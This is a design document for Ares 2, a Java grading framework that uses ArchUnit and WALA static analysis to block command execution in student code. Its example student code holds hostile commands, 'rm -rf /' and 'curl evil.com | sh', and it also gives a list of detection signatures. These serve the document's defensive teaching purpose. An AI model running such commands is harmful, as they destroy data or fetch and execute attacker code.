# Command System Security Mechanism (Architecture Analysis)

## Table of Contents

1. [High-Level Overview](#1-high-level-overview)
   - [1.1 Architecture Analysis Approach](#11-architecture-analysis-approach)
   - [1.2 Configuration Settings](#12-configuration-settings)
   - [1.3 Summary: When Is Command Execution Blocked?](#13-summary-when-is-command-execution-blocked)
   - [1.4 What Code Is Trusted vs. Restricted?](#14-what-code-is-trusted-vs-restricted)
2. [Ares Monitors Command Methods](#2-ares-monitors-command-methods)
   - [2.1 COMMAND SYSTEM - EXECUTE Operations](#21-command-system---execute-operations)
3. [Student Code Triggers Security Check](#3-student-code-triggers-security-check)
4. [Ares Collects Information About the Command Execution](#4-ares-collects-information-about-the-command-execution)
   - [4.1 Loading Java Classes (ArchUnit)](#41-loading-java-classes-archunit)
   - [4.2 Building the Call Graph (WALA)](#42-building-the-call-graph-wala)
5. [Ares Validates the Command Execution](#5-ares-validates-the-command-execution)
   - [5.1 ArchUnit Mode: Static Analysis](#51-archunit-mode-static-analysis)
   - [5.2 WALA Mode: Call Graph Analysis](#52-wala-mode-call-graph-analysis)
   - [5.3 Transitive Access Detection](#53-transitive-access-detection)
   - [5.4 Reachability Analysis (WALA)](#54-reachability-analysis-wala)
   - [5.5 False Positive Filtering (WALA)](#55-false-positive-filtering-wala)
6. [Conclusion](#6-conclusion)

---

# 1. High-Level Overview

This document describes how Ares 2 prevents unauthorized command execution in student code using **static code analysis** techniques via Architecture Testing frameworks.

**Key Difference from AOP Approach:**
- **AOP (Runtime)**: Monitors command execution during program execution and blocks forbidden commands in real-time
- **Architecture (Static)**: Analyzes compiled bytecode before execution to detect potential command execution violations in the code structure

---

## 1.1 Architecture Analysis Approach

**What is Architecture Testing?**

Architecture testing validates that code follows specific structural rules by analyzing compiled bytecode. Instead of running the code and intercepting command execution calls (AOP), it examines the program structure to find violations.

**Think of it like:**
- **AOP = Security Guard**: Checks command parameters when processes are actually spawned
- **Architecture = Building Inspector**: Reviews code structure before execution to ensure no command execution capabilities exist

**Two Analysis Frameworks:**

### **ArchUnit (Static Analysis)**
- **Type**: Pure static analysis using Archunit framework
- **Strength**: Fast, no call graph needed
- **Method**: Analyzes class dependencies and method calls in compiled bytecode
- **Use Case**: Detecting direct and transitive method access patterns to command execution APIs

### **WALA (Dynamic Call Graph Analysis)**
- **Type**: Static analysis with dynamic modeling using IBM WALA framework
- **Strength**: Precise call path detection, understands complex call chains
- **Method**: Builds a complete call graph representing all possible method invocations
- **Use Case**: Finding reachable command execution methods through complex call chains

**Validation Flow:**

1. **Load Classes**: Import compiled `.class` files from classpath
2. **Build Analysis Model**: 
   - ArchUnit: Load class metadata and dependencies
   - WALA: Build complete call graph with entry points
3. **Define Rules**: Specify forbidden method patterns (command execution operations)
4. **Execute Analysis**: Check if student code violates rules
5. **Report Violations**: Generate detailed error messages with call paths

---

## 1.2 Configuration Settings

Security policies are configured through settings that instructors can adjust:

| Setting | Type | Description | Example |
|---------|------|-------------|---------|
| **architectureMode** | `String` | Analysis framework | `"ARCHUNIT"` or `"WALA"` |
| **allowedPackages** | `PackagePermission[]` | Packages allowed to be imported/used | `[new PackagePermission("java.lang")]` |
| **classPath** | `String` | Path to compiled student code | `"target/classes"` |
| **restrictedPackage** | `String` | Package containing student code | `"de.student."` |

**Architecture-Specific Configuration:**
- No command-based permissions (no `commandsAllowedToBeExecuted`, etc.) - Architecture testing detects ANY command execution attempt
- No AOP mode selection - Uses `architectureMode` instead
- Package-level permissions instead of command-level permissions

---

## 1.3 Summary: When Is Command Execution Blocked?

Access is **BLOCKED** 🔴 when **ALL** conditions are true:

1. **Architecture Mode Enabled**: `architectureMode == "ARCHUNIT"` or `architectureMode == "WALA"`
2. **Student Code Contains Command Execution Calls**: Analysis detects method calls to command execution APIs
3. **Calls Are Reachable**: The forbidden methods can be reached from student code (directly or transitively)
4. **Not in Allowed Packages**: The accessed classes are not in the `allowedPackages` list

**If ANY condition fails → No Violation Detected** 🟢

**Key Differences from AOP:**
- 🔴 Detected at analysis time (before execution), not at runtime
- 🔴 Blocks ALL command execution attempts, not just specific commands
- 🔴 Reports potential violations, even if the code path is never executed

**Legend:**
- 🔴 AssertionError thrown → Security violation detected in code structure
- 🟢 No violations found → Code passes architecture analysis

---

## 1.4 What Code Is Trusted vs. Restricted?

**Trusted Code (No Restrictions):**
- Code outside the `restrictedPackage`
- JDK standard library (unless explicitly checking imports)
- Ares internal code

**Restricted Code (Subject to Security Checks):**
- All code within `restrictedPackage`
- All classes that call command execution methods from the forbidden lists

**Security Assumptions:** 
- Student code is compiled and available as `.class` files
- Class files have not been tampered with after compilation
- Call graph accurately represents possible execution paths (WALA mode)

---

# 2. Ares Monitors Command Methods

Both ArchUnit and WALA modes monitor the same set of command execution methods, loaded from template files:

**Template Locations:**
- **ArchUnit**: `src/main/resources/templates/architecture/java/archunit/methods/command-execution-methods.txt`
- **WALA**: `src/main/resources/templates/architecture/java/wala/methods/command-execution-methods.txt`

**What is Architecture Testing?**

Instead of intercepting method calls at runtime (AOP approach), architecture testing analyzes the compiled bytecode to detect which command execution methods the student code accesses. This happens during the test phase, before the code actually runs.

**Two Analysis Approaches:**
- **ArchUnit**: Fast static analysis of class dependencies
- **WALA**: Precise call graph analysis with false positive filtering

---

# 3. Student Code Triggers Security Check

When student code (any code within the configured restricted package) attempts to use one of these command execution methods, the architecture analysis will detect it during the test phase.

**Example:**
```java
// Student Code
package de.student.solution;

import java.lang.Runtime;

public class StudentSolution {
    public void maliciousAction() {
        // This will be detected by architecture analysis
        Runtime.getRuntime().exec("rm -rf /");
    }
}
```

**What happens during analysis:**

**ArchUnit Mode:**
1. `ClassFileImporter` loads `StudentSolution.class`
2. Analyzes that `maliciousAction()` method calls `Runtime.exec()`
3. Checks if `Runtime.exec()` is in the forbidden methods list
4. Reports violation: "StudentSolution.maliciousAction transitively accesses Runtime.exec"

**WALA Mode:**
1. Builds call graph from student code entry points
2. Performs reachability analysis: Can `Runtime.exec()` be reached from student code?
3. Finds path: `StudentSolution.maliciousAction → Runtime.exec`
4. Reports violation with source line number

**Key Difference from AOP:**
- This happens during **test time**, not when the code actually runs
- Detects **all potential command execution attempts** in the code structure, even unreachable code
- No runtime overhead, but cannot check specific command parameters

---

# 4. Ares Collects Information About the Command Execution

During architecture analysis, Ares collects information about the code structure to detect command execution patterns.

---

## 4.1 Loading Java Classes (ArchUnit)

**Framework:** TNGs ArchUnit (https://www.archunit.org/)

**Step 1: Import Compiled Classes**

```java
JavaClasses javaClasses = new ClassFileImporter()
    .withImportOption(ImportOption.Predefined.DO_NOT_INCLUDE_TESTS)
    .withImportOption(location -> {
        String path = location.toString().replace("\\", "/");
        return !path.contains("/ares/api/");  // Exclude Ares internal classes
    })
    .importPackages("de.student");  // Import student package
```

**What happens:**
1. ClassFileImporter scans the classpath for `.class` files
2. Loads class metadata (methods, fields, dependencies)
3. Excludes test classes and Ares internal classes
4. Creates `JavaClasses` object containing all analyzed classes

**Analysis Process:**
1. **Import Classes**: Load `.class` files using `ClassFileImporter`
2. **Analyze Dependencies**: Build class dependency graph
3. **Check Access Patterns**: Detect direct and transitive method calls
4. **Report Violations**: Throw `AssertionError` with call chain details

**Strengths:**
- ✅ Fast analysis (no call graph construction)
- ✅ Detects transitive dependencies (A→B→C where C is forbidden)
- ✅ Simple configuration
- ✅ Good error messages with class names

**Limitations:**
- ⚠️ Less precise than WALA for complex call patterns
- ⚠️ May have false positives for conditional code paths
- ⚠️ Cannot determine if code path is actually reachable at runtime

**Example Violation Detection:**
```java
// Student Code
class StudentCode {
    void maliciousAction() {
        Helper.runSystemCommand();  // Indirect call
    }
}

class Helper {
    void runSystemCommand() {
        Runtime.getRuntime().exec("rm -rf /");  // Forbidden!
    }
}

// ArchUnit detects: StudentCode → Helper.runSystemCommand → Runtime.exec
// Reports: "StudentCode transitively accesses Runtime.exec by [StudentCode.maliciousAction→Helper.runSystemCommand]"
```

---

## 4.2 Building the Call Graph (WALA)

**Framework:** IBM WALA (T.J. Watson Libraries for Analysis)

**How it works:**
```java
// Build call graph
CallGraph cg = new CustomCallgraphBuilder(classPath).buildCallGraph(classPath);

// Find reachable forbidden methods
List<CGNode> path = ReachabilityChecker.findReachableMethods(
    cg, 
    cg.getEntrypointNodes().iterator(),
    node -> forbiddenMethods.contains(node.getMethod().getSignature())
);

if (path != null) {
    throw new AssertionError("Forbidden method reachable: " + path);
}
```

**Analysis Process:**
1. **Create Analysis Scope**: Define which classes to include/exclude
2. **Build Class Hierarchy**: Resolve all type relationships
3. **Construct Call Graph**: Map all possible method call relationships
4. **Find Entry Points**: Identify starting methods in student code
5. **Reachability Analysis**: Use DFS to find paths to forbidden methods
6. **Filter False Positives**: Remove JDK helper paths

**Strengths:**
- ✅ Very precise call path detection
- ✅ Understands complex call patterns (lambdas, method references)
- ✅ Can filter out JDK internal calls (false positive reduction)
- ✅ Provides exact call paths with line numbers
- ✅ Models runtime behavior more accurately

**Limitations:**
- ⚠️ Slower analysis (call graph construction is expensive)
- ⚠️ Requires more memory
- ⚠️ More complex configuration (exclusions, entry points)
- ⚠️ May still have false positives for very dynamic code

**Example Violation Detection:**
```java
// Student Code
class StudentCode {
    void exploit() {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "curl evil.com | sh");
        pb.start();  // Forbidden!
    }
}

// WALA detects: 
// StudentCode.exploit → ProcessBuilder.start
// Reports: Method call at StudentCode.java:5 reaches forbidden ProcessBuilder.start
```

**Special WALA Features:**

**JDK Helper Filtering:**
WALA mode includes intelligent filtering of JDK-internal helper classes that may legitimately invoke process-related operations:
```java
private static final List<String> JDK_HELPERS = List.of(
    "java/lang/ClassLoader",
    "sun/launcher/LauncherHelper"
);

// Ignores paths like: StudentCode → ClassLoader.loadLibrary (legitimate JDK operation)
// Detects real violations: StudentCode → Runtime.exec (direct command execution)
```

---

# 3. Monitored Command System Methods

Both ArchUnit and WALA modes monitor the same set of command execution methods, loaded from template files:

**Template Locations:**
- **ArchUnit**: `src/main/resources/templates/architecture/java/archunit/methods/command-execution-methods.txt`
- **WALA**: `src/main/resources/templates/architecture/java/wala/methods/command-execution-methods.txt`

---

## 3.1 COMMAND SYSTEM - EXECUTE Operations

**Monitored Methods (loaded from `command-execution-methods.txt`):**

**java.lang.Runtime:**
- `Runtime.exec(String)`
- `Runtime.exec(String, String[])`
- `Runtime.exec(String, String[], File)`
- `Runtime.exec(String[])`
- `Runtime.exec(String[], String[])`
- `Runtime.exec(String[], String[], File)`

**java.lang.ProcessBuilder:**
- `ProcessBuilder.<init>(String...)` - Constructor
- `ProcessBuilder.<init>(List<String>)` - Constructor
- `ProcessBuilder.start()`

**Method Signature Format:**
```
java.lang.Runtime.exec(Ljava/lang/String;)Ljava/lang/Process;
java.lang.ProcessBuilder.<init>([Ljava/lang/String;)V
java.lang.ProcessBuilder.start()Ljava/lang/Process;
```

**Why These Methods?**

These are the **primary APIs** in Java for spawning system processes:
- `Runtime.exec()`: Direct command execution through shell
- `ProcessBuilder`: More flexible process creation with environment control

**Coverage:**
- ✅ All overloaded variants of `Runtime.exec()`
- ✅ ProcessBuilder constructors (command stored in object)
- ✅ ProcessBuilder.start() (actual process spawn)

---

# 4. ArchUnit Analysis Flow

## 4.1 Loading Java Classes

**Step 1: Import Compiled Classes**

```java
JavaClasses javaClasses = new ClassFileImporter()
    .withImportOption(ImportOption.Predefined.DO_NOT_INCLUDE_TESTS)
    .withImportOption(location -> {
        String path = location.toString().replace("\\", "/");
        return !path.contains("/ares/api/");  // Exclude Ares internal classes
    })
    .importPackages("de.student");  // Import student package
```

**What happens:**
1. ClassFileImporter scans the classpath for `.class` files
2. Loads class metadata (methods, fields, dependencies)
3. Excludes test classes and Ares internal classes
4. Creates `JavaClasses` object containing all analyzed classes

---

# 5. Ares Validates the Command Execution

---

## 5.1 ArchUnit Mode: Static Analysis

**How it works:**
```java
// Define rule
ArchRule rule = noClasses()
    .should(new TransitivelyAccessesMethodsCondition(
        javaAccess -> forbiddenMethods.contains(javaAccess.getTarget().getFullName())
    ))
    .as("No class should execute commands");

// Execute rule
rule.check(javaClasses);  // Throws AssertionError if violated
```

**Step 2: Create Architecture Rule**

```java
// Load forbidden methods from template file
Set<String> forbiddenMethods = FileTools.readMethodsFile(
    FileTools.readFile(FileHandlerConstants.ARCHUNIT_COMMAND_EXECUTION_METHODS)
);

// Create custom condition that checks method access
DescribedPredicate<JavaAccess<?>> checkForbiddenAccess = 
    new DescribedPredicate<>("accesses forbidden command execution method") {
        @Override
        public boolean test(JavaAccess<?> javaAccess) {
            return forbiddenMethods.stream()
                .anyMatch(method -> javaAccess.getTarget().getFullName().startsWith(method));
        }
    };

// Create rule that no class should access forbidden methods
ArchRule rule = ArchRuleDefinition.noClasses()
    .should(new TransitivelyAccessesMethodsCondition(checkForbiddenAccess))
    .as("No class should execute commands");
```

**Rule Components:**
- **DescribedPredicate**: Tests if a method access is forbidden
- **TransitivelyAccessesMethodsCondition**: Finds transitive access paths
- **ArchRule**: Complete rule that can be checked against JavaClasses

**Step 3: Run Architecture Test**

```java
try {
    rule.check(javaClasses);  // Throws AssertionError if violated
} catch (AssertionError e) {
    // Parse error message and throw SecurityException
    JavaArchitectureTestCase.parseErrorMessage(e);
}
```

**When violation is found:**
```
Architecture Violation [Priority: MEDIUM] - Rule 'No class should execute commands' was violated (1 times):
Method <de.student.StudentCode.exploit()> transitively accesses method <java.lang.Runtime.exec(Ljava/lang/String;)Ljava/lang/Process;> by 
  [de.student.StudentCode.exploit() -> de.student.Helper.runCommand() -> java.lang.Runtime.exec()]
```

**Error is converted to:**
```java
throw new SecurityException(
    "Ares Security Error (Reason: Student-Code; Stage: Execution): " +
    "Illegal command execution: StudentCode.exploit transitively calls Runtime.exec"
);
```

**Violation Example:**
```
Architecture Violation [Priority: MEDIUM] - Rule 'No class should execute commands' was violated (1 times):
Method <de.student.StudentCode.exploit()> transitively accesses method <java.lang.Runtime.exec(Ljava/lang/String;)Ljava/lang/Process;> by 
  [de.student.StudentCode.exploit() -> de.student.Helper.runCommand() -> java.lang.Runtime.exec()]
```

**Best For:**
- Quick validation during development
- Broad detection of command execution patterns
- When exact call paths are not critical

---

## 5.2 WALA Mode: Call Graph Analysis

**How it works:**
```java
// Build call graph
CallGraph cg = new CustomCallgraphBuilder(classPath).buildCallGraph(classPath);

// Find reachable forbidden methods
List<CGNode> path = ReachabilityChecker.findReachableMethods(
    cg, 
    cg.getEntrypointNodes().iterator(),
    node -> forbiddenMethods.contains(node.getMethod().getSignature())
);

if (path != null) {
    throw new AssertionError("Forbidden method reachable: " + path);
}
```

**Example Violation Detection:**
```java
// Student Code
class StudentCode {
    void exploit() {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "curl evil.com | sh");
        pb.start();  // Forbidden!
    }
}

// WALA detects: 
// StudentCode.exploit → ProcessBuilder.start
// Reports: Method call at StudentCode.java:5 reaches forbidden ProcessBuilder.start
```

**Violation Example:**
```
Forbidden method 'java.lang.ProcessBuilder.start()Ljava/lang/Process;' is reachable from 'de.student.StudentCode.exploit()V' 
in class 'de.student.StudentCode' at line 23
Called by test method: 'org.example.TestClass.testExploit()V'
```

**Best For:**
- Precise violation detection
- Understanding exact call paths
- Production-grade security validation
- Reducing false positives

---

## 5.3 Transitive Access Detection

**How TransitivelyAccessesMethodsCondition Works:**

```java
public class TransitivelyAccessesMethodsCondition extends ArchCondition<JavaClass> {
    
    @Override
    public void check(JavaClass clazz, ConditionEvents events) {
        // Get all method accesses from this class
        for (JavaAccess<?> access : clazz.getAccessesFromSelf()) {
            // Find transitive path to forbidden method
            List<JavaAccess<?>> path = findPathToViolatingMethod(access);
            
            if (!path.isEmpty()) {
                // Report violation with complete call chain
                events.add(createViolationEvent(access, path));
            }
        }
    }
    
    private List<JavaAccess<?>> findPathToViolatingMethod(JavaAccess<?> access) {
        // Use DFS to find path from current access to forbidden method
        // Returns: [access1 -> access2 -> ... -> forbiddenAccess]
    }
}
```

**Example Path Detection:**

```
StudentCode.exploit() calls:
  ├─ Helper.runCommand() ✓ (not forbidden, continue searching)
  │   └─ Runtime.exec("rm -rf /") ✗ (FORBIDDEN! Report path)
  └─ System.out.println() ✓ (not forbidden, ignore)

Result: Path found = [StudentCode.exploit → Helper.runCommand → Runtime.exec]
```

---

## 5.4 Reachability Analysis (WALA)

**Step 4: Find Paths to Forbidden Methods**

```java
// Load forbidden methods
Set<String> forbiddenMethods = FileTools.readMethodsFile(
    FileTools.readFile(FileHandlerConstants.WALA_COMMAND_EXECUTION_METHODS)
);

// Find reachable forbidden methods
List<CGNode> path = ReachabilityChecker.findReachableMethods(
    callGraph,
    callGraph.getEntrypointNodes().iterator(),
    node -> forbiddenMethods.stream()
        .anyMatch(sig -> node.getMethod().getSignature().startsWith(sig))
);

if (path != null && !path.isEmpty()) {
    // Extract source position
    IMethod.SourcePosition sourcePos = path.get(path.size() - 1)
        .getMethod()
        .getSourcePosition(0);
    
    throw new AssertionError(String.format(
        "Forbidden method '%s' reachable from '%s' at line %d",
        path.get(path.size() - 1).getMethod().getSignature(),
        path.get(0).getMethod().getSignature(),
        sourcePos.getFirstLine()
    ));
}
```

**DFS Path Finding Algorithm:**

```java
public class CustomDFSPathFinder {
    List<CGNode> find() {
        Set<CGNode> visited = new HashSet<>();
        Stack<CGNode> currentPath = new Stack<>();
        
        for (CGNode entryPoint : entryPoints) {
            List<CGNode> result = dfs(entryPoint, visited, currentPath);
            if (result != null) return result;
        }
        return null;
    }
    
    List<CGNode> dfs(CGNode node, Set<CGNode> visited, Stack<CGNode> path) {
        if (visited.contains(node)) return null;
        visited.add(node);
        path.push(node);
        
        // Check if this node is a target
        if (isTargetNode(node)) {
            return new ArrayList<>(path);  // Found path!
        }
        
        // Recursively check successors
        for (CGNode successor : callGraph.getSuccNodes(node)) {
            List<CGNode> result = dfs(successor, visited, path);
            if (result != null) return result;
        }
        
        path.pop();
        return null;
    }
}
```

**Example Reachability Detection:**

```
Entry: StudentCode.exploit()
  ↓ calls
ProcessBuilder.<init>(["rm", "-rf", "/"])
  ↓ calls
ProcessBuilder.start()  ← FORBIDDEN METHOD REACHED!

Path: [StudentCode.exploit, ProcessBuilder.<init>, ProcessBuilder.start]
```

---

## 5.5 False Positive Filtering (WALA)

**Challenge:** Some JDK classes may legitimately use ProcessBuilder internally for system operations (e.g., launching native libraries).

**Solution:** Filter out paths that only go through JDK helper classes.

```java
private static final List<String> JDK_HELPERS = List.of(
    "Ljava/lang/ClassLoader", "java/lang/ClassLoader",
    "Lsun/launcher/", "sun/launcher/"
);

private static final List<String> ALLOWED_HELPER_APIS = List.of(
    "java.lang.ClassLoader.loadLibrary",
    "java.lang.Runtime.loadLibrary"
);

// Check if path should be ignored
boolean isHelperPath(List<CGNode> path) {
    CGNode forbidden = path.get(path.size() - 1);
    
    // Is the forbidden API actually an allowed helper API?
    boolean helperApi = ALLOWED_HELPER_APIS.stream()
        .anyMatch(sig -> forbidden.getMethod().getSignature().startsWith(sig));
    
    // Does the path contain JDK helper classes?
    boolean helperSeen = path.stream().anyMatch(node -> {
        String cls = node.getMethod().getDeclaringClass().getName().toString();
        return JDK_HELPERS.stream().anyMatch(cls::startsWith);
    });
    
    // Ignore if it's a helper API called through helper classes
    return helperApi && helperSeen;
}
```

**Example Filtering:**

**Path 1 (Ignored):**
```
StudentCode.loadNativeLib()
  ↓
ClassLoader.loadLibrary()  (JDK helper)
  ↓
Runtime.loadLibrary()  (allowed helper API)

Result: IGNORED (legitimate JDK library loading)
```

**Path 2 (Detected):**
```
StudentCode.exploit()
  ↓
Runtime.exec("curl evil.com")  (forbidden, no helpers in path)

Result: VIOLATION (direct command execution by student)
```

**Special WALA Features:**

**JDK Helper Filtering:**
WALA mode includes intelligent filtering of JDK-internal helper classes that may legitimately invoke process-related operations:
```java
private static final List<String> JDK_HELPERS = List.of(
    "java/lang/ClassLoader",
    "sun/launcher/LauncherHelper"
);

// Ignores paths like: StudentCode → ClassLoader.loadLibrary (legitimate JDK operation)
// Detects real violations: StudentCode → Runtime.exec (direct command execution)
```

## 6.1 Writing Architecture Test Cases

Architecture test cases can be **generated as Java code** for integration into test suites.

**ArchUnit Test Case Generation:**

```java
JavaArchunitTestCase testCase = JavaArchunitTestCase.archunitBuilder()
    .javaArchitectureTestCaseSupported(JavaArchitectureTestCaseSupported.COMMAND_EXECUTION)
    .allowedPackages(Set.of(new PackagePermission("java.lang")))
    .javaClasses(javaClasses)
    .build();

String testCode = testCase.writeArchitectureTestCase("ARCHUNIT", "");
```

**Generated Code Example:**
```java
@Test
void testNoCommandExecution() {
    JavaClasses javaClasses = new ClassFileImporter()
        .withImportOption(ImportOption.Predefined.DO_NOT_INCLUDE_TESTS)
        .withImportOption(location -> {
            String path = location.toString().replace("\\", "/");
            return !path.contains("/ares/api/");
        })
        .importPackages("de.student");
    
    Set<PackagePermission> allowedPackages = Set.of(
        new PackagePermission("java.lang")
    );
    
    JavaArchunitTestCaseCollection.NO_CLASS_MUST_EXECUTE_COMMANDS
        .check(javaClasses);
}
```

**WALA Test Case Generation:**

```java
JavaWalaTestCase testCase = JavaWalaTestCase.walaBuilder()
    .javaArchitectureTestCaseSupported(JavaArchitectureTestCaseSupported.COMMAND_EXECUTION)
    .allowedPackages(Set.of(new PackagePermission("java.lang")))
    .javaClasses(javaClasses)
    .callGraph(callGraph)
    .build();

String testCode = testCase.writeArchitectureTestCase("WALA", "");
```

**Generated Code Example:**
```java
@Test
void testNoCommandExecution() {
    String classPath = System.getProperty("java.class.path");
    CallGraph callGraph = new CustomCallgraphBuilder(classPath)
        .buildCallGraph(classPath);
    
    Set<PackagePermission> allowedPackages = Set.of(
        new PackagePermission("java.lang")
    );
    
    JavaWalaTestCaseCollection.NO_CLASS_MUST_EXECUTE_COMMANDS
        .check(callGraph);
}
```

---

# 6. Conclusion

## Summary for Programming Instructors (TL;DR)

**What does Architecture Testing do?**
- ✅ Analyzes **compiled bytecode** to detect forbidden command execution operations
- ✅ Works **before code execution** - catches violations during testing phase
- ✅ Provides **two analysis modes**: Fast (ArchUnit) and Precise (WALA)
- ✅ Detects **transitive calls** - finds violations even through helper methods
- ✅ Generates **clear error messages** with complete call chains

**When do you need this?**
- When you want to prevent students from executing system commands entirely
- For pre-submission checks (CI/CD pipelines)
- When runtime monitoring (AOP) is not feasible or desired
- For comprehensive code structure validation

**How does it work (simplified)?**
1. Compile student code to `.class` files
2. Architecture analysis scans bytecode for command execution method calls
3. If forbidden patterns detected → Report violation with call chain
4. Unlike AOP, this happens during testing, not when code runs

---

## Comparison: Architecture vs. AOP

| Aspect | Architecture (ArchUnit/WALA) | AOP (Byte Buddy/AspectJ) |
|--------|------------------------------|--------------------------|
| **Analysis Time** | Before execution (static) | During execution (runtime) |
| **Detection** | Analyzes code structure | Intercepts method calls |
| **Granularity** | Binary (allowed/forbidden) | Command-based permissions |
| **Performance Impact** | Analysis overhead only | Runtime overhead on every call |
| **False Positives** | Possible (unreachable code) | None (only executed code checked) |
| **Coverage** | All code paths | Only executed paths |
| **Configuration** | Package-level permissions | Command-level permissions |
| **Use Case** | Pre-submission validation | Runtime security enforcement |
| **Error Timing** | Test phase | Production execution |

---

## Technical Details

### **ArchUnit Mode (Static Analysis)**

**Implementation:**
- Uses ArchUnit's `ArchRule` and custom `TransitivelyAccessesMethodsCondition`
- Analyzes class dependencies and method access patterns
- No call graph construction required

**Violation Example:**
```
Architecture Violation [Priority: MEDIUM] - Rule 'No class should execute commands' was violated (1 times):
Method <de.student.StudentCode.exploit()> transitively accesses method <java.lang.Runtime.exec(Ljava/lang/String;)Ljava/lang/Process;> by 
  [de.student.StudentCode.exploit() -> de.student.Helper.runCommand() -> java.lang.Runtime.exec()]
```

**Best For:**
- Quick validation during development
- Broad detection of command execution patterns
- When exact call paths are not critical

---

### **WALA Mode (Call Graph Analysis)**

**Implementation:**
- Builds complete call graph using IBM WALA framework
- Performs reachability analysis from entry points to forbidden methods
- Includes false positive filtering for JDK internals

**Violation Example:**
```
Forbidden method 'java.lang.ProcessBuilder.start()Ljava/lang/Process;' is reachable from 'de.student.StudentCode.exploit()V' 
in class 'de.student.StudentCode' at line 23
Called by test method: 'org.example.TestClass.testExploit()V'
```

**Best For:**
- Precise violation detection
- Understanding exact call paths
- Production-grade security validation
- Reducing false positives

---

### **Forbidden Method Templates**

Both modes load forbidden methods from text files:

**File Format:**
```
# Runtime.exec variants
java.lang.Runtime.exec(Ljava/lang/String;)Ljava/lang/Process;
java.lang.Runtime.exec([Ljava/lang/String;)Ljava/lang/Process;
java.lang.Runtime.exec(Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/Process;
java.lang.Runtime.exec(Ljava/lang/String;[Ljava/lang/String;Ljava/io/File;)Ljava/lang/Process;
java.lang.Runtime.exec([Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/Process;
java.lang.Runtime.exec([Ljava/lang/String;[Ljava/lang/String;Ljava/io/File;)Ljava/lang/Process;

# ProcessBuilder
java.lang.ProcessBuilder.<init>([Ljava/lang/String;)V
java.lang.ProcessBuilder.<init>(Ljava/util/List;)V
java.lang.ProcessBuilder.start()Ljava/lang/Process;
```

**Template Locations:**
- ArchUnit: `src/main/resources/templates/architecture/java/archunit/methods/command-execution-methods.txt`
- WALA: `src/main/resources/templates/architecture/java/wala/methods/command-execution-methods.txt`

---

### **Integration Example**

**Maven Project Setup:**
```xml
<dependencies>
    <dependency>
        <groupId>de.tum.cit.ase</groupId>
        <artifactId>ares</artifactId>
        <version>2.0.1-Beta6</version>
    </dependency>
</dependencies>
```

**Test Class:**
```java
@Test
void testNoCommandExecution() {
    // Load student classes
    JavaClasses javaClasses = new ClassFileImporter()
        .importPackages("de.student");
    
    // Create test case
    JavaArchitectureTestCase testCase = JavaArchitectureTestCase.builder()
        .javaArchitectureTestCaseSupported(JavaArchitectureTestCaseSupported.COMMAND_EXECUTION)
        .allowedPackages(Set.of())
        .javaClasses(javaClasses)
        .callGraph(null)  // null for ArchUnit mode
        .build();
    
    // Execute
    testCase.executeArchitectureTestCase("ARCHUNIT", "");
}
```

---

**The architecture testing approach provides comprehensive security validation at compile/test time, complementing the runtime AOP approach for defense-in-depth security against command execution attacks.**
